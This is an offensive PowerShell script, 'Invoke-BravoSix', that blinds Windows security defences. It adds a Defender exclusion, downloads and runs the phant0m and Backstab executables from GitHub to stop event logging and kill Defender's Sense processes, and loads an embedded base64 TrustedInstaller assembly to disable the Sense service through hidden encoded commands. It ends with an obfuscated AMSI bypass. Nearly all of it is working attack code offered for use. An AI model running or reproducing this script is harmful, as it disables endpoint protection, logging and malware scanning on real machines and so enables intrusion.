function Invoke-BravoSix {
    $goingdark = "X19fICBfX19fIF9fX18gXyAgXyBfX19fICAgIF9fX18gXyBfICBfICAgICAgX19fXyBfX19fIF8gXyAgXyBfX19fICAgIF9fXyAgX19fXyBfX19fIF8gIF8gDQp8X19dIHxfXy8gfF9ffCB8ICB8IHwgIHwgICAgW19fICB8ICBcLyAgICAgICB8IF9fIHwgIHwgfCB8XCB8IHwgX18gICAgfCAgXCB8X198IHxfXy8gfF8vICANCnxfX10gfCAgXCB8ICB8ICBcLyAgfF9ffCAgICBfX19dIHwgXy9cXyAuICAgIHxfX10gfF9ffCB8IHwgXHwgfF9fXSAgICB8X18vIHwgIHwgfCAgXCB8IFxfIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA="
    Write-Host([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($goingdark)))
    Write-Host "-... .-. .- ...- ---    ... .. -..- --..--    --. --- .. -. --.    -.. .- .-. -.- "

    # setting Windows Defender to exclude the current directory
    Write-Host "[i] Setting Windows Defender to exclude the C:\Windows\Temp directory"
    Add-MpPreference -ExclusionPath "C:\Windows\Temp"
    $downloadDirectory = "C:\Windows\Temp"

    # phanth0m disable event log
    Write-Host "[i] Disabling Event Log"
    Write-Host "[i] Downloading phanth0m"
    Invoke-WebRequest -Uri https://github.com/RFC1918-hub/RFCRandom/raw/main/phant0m-exe.exe -OutFile $downloadDirectory\phant0m-exe.exe
    Write-Host "[i] Running phanth0m"
    & $downloadDirectory\phant0m-exe.exe

    TrustedInstaller
    # disable Windows Defender services
    $defenderServices = @("Sense")
    $powershellPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    $servicesRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\"

    foreach ($service in $defenderServices) {
        Write-Host "[i] Disabling $service service..."
        Write-Host "[i] Renaming $service service ImagePath type to BravoSix ..."
        Write-Host "[i] Original ImagePath value: $((Get-ItemProperty -Path $servicesRegPath$service).ImagePath)"
        $powershellCmd = "Rename-ItemProperty -Path $servicesRegPath$service -Name ImagePath -NewName BravoSix"
        $powershellBytes = [System.Text.Encoding]::Unicode.GetBytes($powershellCmd)
        $powershellEncoded = [System.Convert]::ToBase64String($powershellBytes)
        [TrustedInstaller.Program]::Main("$powershellPath -windowstyle hidden -e $powershellEncoded")
        Start-Sleep 1
        Write-Host "[i] New BravoSix value: $((Get-ItemProperty -Path $servicesRegPath$service).BravoSix)"
        Write-Host
        Write-Host
    }

    # backstab to kill defender processes
    Write-Host "[i] Downloading backstab"
    Invoke-WebRequest https://github.com/RFC1918-hub/RFCRandom/raw/main/Backstab.exe -OutFile $downloadDirectory\Backstab.exe
    Write-Host "[i] Running backstab"
    # killing all sense processes
    Write-Host "[i] Killing all Sense processes"
    Get-Process | Where-Object {$_.ProcessName -like "*Sense*"} | ForEach-Object {& $downloadDirectory\Backstab.exe -n $_.Id -k}
}

function Invoke-BravoSixCleanUp {
    TrustedInstaller
    # enable Windows Defender services
    $defenderServices = @("Sense")
    $powershellPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    $servicesRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\"

    foreach ($service in $defenderServices) {
        Write-Host "[i] Disabling $service service..."
        Write-Host "[i] Renaming $service service BravoSix type to ImagePath ..."
        Write-Host "[i] Original BravoSix value: $((Get-ItemProperty -Path $servicesRegPath$service).BravoSix)"
        $powershellCmd = "Rename-ItemProperty -Path $servicesRegPath$service -Name BravoSix -NewName ImagePath"
        $powershellBytes = [System.Text.Encoding]::Unicode.GetBytes($powershellCmd)
        $powershellEncoded = [System.Convert]::ToBase64String($powershellBytes)
        [TrustedInstaller.Program]::Main("$powershellPath -windowstyle hidden -e $powershellEncoded")
        Write-Host "[i] New ImagePath value: $((Get-ItemProperty -Path $servicesRegPath$service).ImagePath)"
        Start-Sleep 1
        Write-Host
        Write-Host
    }

    # cleaning up downloadables
    $downloadDirectory = "C:\Windows\Temp"

    if (Test-Path $downloadDirectory\phant0m-exe.exe) {
        Remove-Item -Path $downloadDirectory\phant0m-exe.exe -Force 
    }
    if (Test-Path $downloadDirectory\Backstab.exe) {
        Remove-Item -Path $downloadDirectory\Backstab.exe -Force
    }
    Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
}

function TrustedInstaller {
    $trustedInstaller = "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Y2F0aW9uTmFtZQBHZXRQcm9jZXNzZXNCeU5hbWUAbHBDb21tYW5kTGluZQBXcml0ZUxpbmUAVmFsdWVUeXBlAFVwZGF0ZVByb2NUaHJlYWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAZHdGaWxsQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAGxwVmFsdWUAbHBQcmV2aW91c1ZhbHVlAFRydXN0ZWRJbnN0YWxsZXIuZXhlAGR3WFNpemUAZHdZU2l6ZQBnZXRfU2l6ZQBjYlNpemUAbHBSZXR1cm5TaXplAGxwU2l6ZQBTaXplT2YAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBUb1N0cmluZwBuTGVuZ3RoAEFsbG9jSEdsb2JhbABNYXJzaGFsAFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwAV2luZG93c1ByaW5jaXBhbABrZXJuZWwzMi5kbGwAUHJvZ3JhbQBTeXN0ZW0AVGltZVNwYW4ATWFpbgBscFByb2Nlc3NJbmZvcm1hdGlvbgBTeXN0ZW0uUmVmbGVjdGlvbgBscFN0YXJ0dXBJbmZvAENvbnNvbGVLZXlJbmZvAFplcm8AbHBEZXNrdG9wAFRydXN0ZWRJbnN0YWxsZXIAU2VydmljZUNvbnRyb2xsZXIAaFN0ZEVycm9yAEdldExhc3RFcnJvcgAuY3RvcgBscFNlY3VyaXR5RGVzY3JpcHRvcgBXcml0ZUludFB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MARnJvbVNlY29uZHMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAYkluaGVyaXRIYW5kbGVzAGxwVGhyZWFkQXR0cmlidXRlcwBscFByb2Nlc3NBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBkd0ZsYWdzAGFyZ3MAZHdYQ291bnRDaGFycwBkd1lDb3VudENoYXJzAHByb2Nlc3NBY2Nlc3MAU3lzdGVtLlNlcnZpY2VQcm9jZXNzAENyZWF0ZVByb2Nlc3MAaFByb2Nlc3MAT3BlblByb2Nlc3MAZ2V0X1N0YXR1cwBTZXJ2aWNlQ29udHJvbGxlclN0YXR1cwBXYWl0Rm9yU3RhdHVzAENvbmNhdABGb3JtYXQAT2JqZWN0AG9wX0V4cGxpY2l0AGxwRW52aXJvbm1lbnQAR2V0Q3VycmVudABkd0F0dHJpYnV0ZUNvdW50AFN0YXJ0AEluaXRpYWxpemVQcm9jVGhyZWFkQXR0cmlidXRlTGlzdABscEF0dHJpYnV0ZUxpc3QAaFN0ZElucHV0AGhTdGRPdXRwdXQAd1Nob3dXaW5kb3cAUmVhZEtleQBscEN1cnJlbnREaXJlY3RvcnkAb3BfRXF1YWxpdHkAV2luZG93c0lkZW50aXR5AABbWQBvAHUAIABuAGUAZQBkACAAdABvACAAcgB1AG4AIAB0AGgAaQBzACAAcAByAG8AZwByAGEAbQAgAGEAcwAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAAGtbAGkAXQAgAEMAaABlAGMAawBpAG4AZwAgAHQAaABhAHQAIABUAHIAdQBzAHQAZQBkAEkAbgBzAHQAYQBsAGwAZQByACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgAHIAdQBuAG4AaQBuAGcAACFUAHIAdQBzAHQAZQBkAEkAbgBzAHQAYQBsAGwAZQByAABLWwBpAF0AIABUAHIAdQBzAHQAZQBkACAAaQBuAHMAdABhAGwAbABlAHIAIABwAHIAbwBjAGUAcwBzACAAaQBkADoAIAB7ADAAfQAAZVsAIQBdACAARQBSAFIATwBSACAARgBhAGkAbABlAGQA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

    [System.Reflection.Assembly]::Load([Convert]::FromBase64String($trustedInstaller)) | Out-Null
}

# main
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "You must be an Administrator to run this script."
    return
}

$t = [Ref].Assembly.GetTypes() | foreach {if ($_.Name -like "*iUtils") {$u=$_}}
Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("JABmAHMAIAA9ACAAJAB1AC4ARwBlAHQARgBpAGUAbABkAHMAKAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApACAAfAAgAGYAbwByAGUAYQBjAGgAIAB7AGkAZgAgACgAJABfAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACIAKgBJAG4AaQB0AEYAYQBpAGwAZQBkACIAKQAgAHsAJABmAD0AJABfAH0AfQA=")))
$f.SetValue($null,$true)